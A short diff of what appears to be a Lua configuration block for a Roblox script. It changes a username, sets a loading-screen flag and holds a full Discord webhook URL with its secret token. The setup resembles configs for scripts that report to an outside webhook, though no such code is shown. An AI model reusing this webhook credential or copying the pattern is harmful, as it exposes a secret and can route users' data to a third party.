@@ -1,4 +1,4 @@
-Username = "Xmanbrotheredi"
+Username = "Xmanbrothered"
 WebHook = "https://discord.com/api/webhooks/1097898996376281210/UU_1EwqdQbdlGUS1shWrOWn32tfrwjXHhN06GhJU1a2dgmJqmVvG4WSNVjR0Sd7r4e-k"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
